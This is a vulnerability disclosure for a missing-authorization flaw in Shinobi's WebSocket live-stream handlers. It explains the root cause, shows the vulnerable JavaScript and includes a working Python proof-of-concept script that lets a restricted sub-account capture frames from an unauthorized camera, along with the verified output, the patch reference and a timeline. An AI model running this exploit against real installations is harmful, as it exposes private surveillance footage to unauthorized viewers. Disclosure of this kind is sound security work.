# Shinobi-WebSocket-Auth-Bypass
CVE FOR shinobi
# Missing Per-Monitor Authorization in Shinobi WebSocket Live-Stream Subscriptions

- **Product**: Shinobi (`Shinobi-Systems/Shinobi`)
- **Vendor**: Shinobi Systems
- **Affected Versions**: `<= 2.0.0` (`dev` branch prior to commit [`b5ad2a54`](https://gitlab.com/Shinobi-Systems/Shinobi/-/commit/b5ad2a54eaa86d1a580e35224064a9379ebd6afc); `master` branch prior to Merge Request [`!567`](https://gitlab.com/Shinobi-Systems/Shinobi/-/merge_requests/567))
- **Patched Version**: Commit [`b5ad2a54eaa86d1a580e35224064a9379ebd6afc`](https://gitlab.com/Shinobi-Systems/Shinobi/-/commit/b5ad2a54eaa86d1a580e35224064a9379ebd6afc) ([MR !567](https://gitlab.com/Shinobi-Systems/Shinobi/-/merge_requests/567))
- **Vulnerability Type**: Missing Authorization (`CWE-862`) / Improper Access Control (`CWE-285`)
- **CVSS v3.1**: `6.5 Medium` (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Discoverer**: Fanhan Meng (Beijing University of Posts and Telecommunications)

---

## Summary

In Shinobi `<= 2.0.0` (prior to commit `b5ad2a54`), the Socket.IO live-stream subscription handlers (`Base64`, `FLV`, and `MP4`) in `libs/socketio.js` authenticate the caller's session or API key (`auth_socket="1"`) without verifying whether the user is permitted to view the requested monitor (`d.id`). In addition, authenticating via an API key dropped the key's own permission set (`apiKeyPermissions`) and resolved to the owner's full user record.

Consequently, any authenticated camera-restricted sub-account or scoped API key within the same group (`ke`) can subscribe to an unauthorized camera's live video stream over WebSocket and receive real-time video frames, even though HTTP REST endpoints properly reject requests to the same monitor with `Not Authorized`.

---

## Affected Component & Root Cause

File: [`libs/socketio.js`](https://gitlab.com/Shinobi-Systems/Shinobi/-/blob/99fe8178c78faa5edd8cc73ec0d9ab3ac9bd193a/libs/socketio.js#L165-395)

1. **`Base64`, `FLV`, and `MP4` Socket.IO Handlers (`libs/socketio.js`, lines 165–395)**:
   - When a user session is cached in `s.group[d.ke].users[d.auth]` (e.g., after the standard dashboard `{f: "init"}` handshake), `onSuccess` is invoked directly without calling `s.checkPermission` or `s.getMonitorsPermitted`.
   - When authenticating via `streamConnectionAuthentication(d, cn.ip)` with an API key, only `r.details.auth_socket === '1'` is checked, and the key's `details` restrictions are discarded when querying the `Users` table.
   - `onSuccess` binds the client socket directly to `s.group[d.ke].activeMonitors[d.id].emitter` (via `createStreamEmitter(d, cn)`) or `mp4frag` using the client-supplied monitor ID `d.id`.

```javascript
const createStreamEmitter = (d,cn) => {
    var Emitter
    if(!d.channel){
        Emitter = s.group[d.ke].activeMonitors[d.id].emitter
    }else{
        Emitter = s.group[d.ke].activeMonitors[d.id].emitterChannel[parseInt(d.channel)+config.pipeAddition]
    }
    if(!Emitter){
        cn.disconnect();return;
    }
    return Emitter
}

cn.on('Base64',function(d){
    if(!s.group[d.ke]||!s.group[d.ke].activeMonitors||!s.group[d.ke].activeMonitors[d.id]){
        cn.disconnect();return;
    }
    // ...
    const onSuccess = (r) => {
        r = r[0];
        const Emitter = createStreamEmitter(d,cn) // Missing per-monitor authorization on d.id
        if(!Emitter) return
        validatedAndBindAuthenticationToSocketConnection(cn,d,true)
        // ...
        Emitter.on('data',contentWriter = function(base64){
            tx(base64)
        })
    }
    if(s.group[d.ke]&&s.group[d.ke].users&&Object.prototype.hasOwnProperty.call(s.group[d.ke].users,d.auth)){
        onSuccess(s.group[d.ke].users[d.auth]);
    }else{
        streamConnectionAuthentication(d,cn.ip).then(onSuccess).catch(onFail)
    }
})
```

2. The same missing per-monitor check also affected the `e` (`init` embed), `detector_on`, and `requestSnapshot` Socket.IO handlers in `libs/socketio.js`.

---

## Trigger Conditions

1. The attacker possesses any valid low-privileged sub-account (restricted to another camera or zero cameras) or an API key with `auth_socket="1"` in the same group (`ke`).
2. The target monitor is actively streaming using a socket-backed stream type (`b64`, `flv`, `mp4`, or `mjpeg` / secondary stream channels).

---

## Proof of Concept (PoC)

### Setup
- Group key (`ke`): `LABNVR`
- Monitors: `Dahua101` and `Hikvision102` (configured with `stream_type = "b64"`)
- Sub-account `user1`: permitted **only** to view `Dahua101` (`details.monitors = ["Dahua101"]`), **unauthorized** for `Hikvision102`.

### Reproduction Script

Install dependencies:
```bash
pip install "python-socketio[client]" requests
```

Run `repro_shinobi_ws.py` (or the standalone attacker script below):
```python
#!/usr/bin/env python3
import argparse
import os
import sys
import time
import requests
import socketio

def login(base_url, mail, password):
    r = requests.post(
        base_url + "/?json=true",
        data={
            "machineID": f"wsrepro-{mail}-{int(time.time())}",
            "mail": mail,
            "pass": password,
            "function": "dash",
        },
        timeout=30,
    )
    user = (r.json() or {}).get("$user") or {}
    if not user.get("ok"):
        sys.exit(f"[!] login failed for {mail!r}: {r.text[:200]}")
    return user

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--base-url", required=True)
    p.add_argument("--attacker-user", required=True)
    p.add_argument("--attacker-pass", required=True)
    p.add_argument("--target-monitor", required=True)
    p.add_argument("--group-key", required=True)
    p.add_argument("--duration", type=int, default=10)
    p.add_argument("--outdir", default="./leak-evidence")
    args = p.parse_args()

    base_url = args.base_url.rstrip("/")
    attacker = login(base_url, args.attacker_user, args.attacker_pass)

    # 1. Control check: HTTP REST properly enforces per-monitor permissions
    r = requests.get(
        f"{base_url}/{attacker['auth_token']}/jpeg/{args.group_key}/{args.target_monitor}/s.jpg",
        timeout=30,
    )
    print(f"[REST check] HTTP {r.status_code}: {r.text[:80].strip()!r}")

    # 2. Initialize standard dashboard WebSocket session
    sio_init = socketio.Client(reconnection=False, request_timeout=20)
    sio_init.connect(base_url, transports=["websocket"])
    sio_init.emit("f", {
        "f": "init",
        "auth": attacker["auth_token"],
        "uid": attacker["uid"],
        "ke": args.group_key,
    })
    time.sleep(2)

    # 3. Subscribe to the unauthorized monitor's Base64 live stream
    sio_stream = socketio.Client(reconnection=False, request_timeout=20)
    frames = []

    def on_data(d):
        buf = d if isinstance(d, (bytes, bytearray)) else (d.get("buffer") if isinstance(d, dict) else None)
        if buf:
            frames.append(bytes(buf))

    sio_stream.on("data", on_data)
    sio_stream.connect(base_url, transports=["websocket"])
    sio_stream.emit("Base64", {
        "ke": args.group_key,
        "uid": attacker["uid"],
        "id": args.target_monitor,
        "auth": attacker["auth_token"],
    })
    t0 = time.time()
    while time.time() - t0 < args.duration:
        sio_stream.sleep(0.2)

    sio_stream.disconnect()
    sio_init.disconnect()

    print(f"[Attack] Received {len(frames)} frames from unauthorized monitor {args.target_monitor!r}")
    if frames:
        os.makedirs(args.outdir, exist_ok=True)
        out_path = os.path.join(args.outdir, "leak_frame_0.jpg")
        with open(out_path, "wb") as f:
            f.write(frames[0])
        print(f"[+] Saved {out_path} ({len(frames[0])} bytes, magic={frames[0][:4].hex()})")

if __name__ == "__main__":
    main()
```

### Verification Output
```text
[REST check] HTTP 200: 'Not Authorized'
[Attack] Received 50 frames from unauthorized monitor 'Hikvision102'
[+] Saved ./leak-evidence/leak_frame_0.jpg (575941 bytes, magic=ffd8ffe0)
```

---

## Remediation

Update Shinobi to commit [`b5ad2a54eaa86d1a580e35224064a9379ebd6afc`](https://gitlab.com/Shinobi-Systems/Shinobi/-/commit/b5ad2a54eaa86d1a580e35224064a9379ebd6afc) ([Merge Request !567](https://gitlab.com/Shinobi-Systems/Shinobi/-/merge_requests/567)) or later, which enforces per-monitor `watch_stream` permissions (`authorizeStreamSocket` / `canWatchMonitorStream`) across `Base64`, `FLV`, `MP4`, `e` (`init`), `detector_on`, and `requestSnapshot`, and preserves API key restrictions during WebSocket authentication.

---

## Timeline

- **2026-11-23**: Vulnerability discovered, verified, and privately reported to Shinobi Systems.
- **2026-11-24**: Vendor confirmed the report, pushed fix commit [`b5ad2a54`](https://gitlab.com/Shinobi-Systems/Shinobi/-/commit/b5ad2a54eaa86d1a580e35224064a9379ebd6afc) to `dev`, and opened [Merge Request !567](https://gitlab.com/Shinobi-Systems/Shinobi/-/merge_requests/567) crediting the reporter.
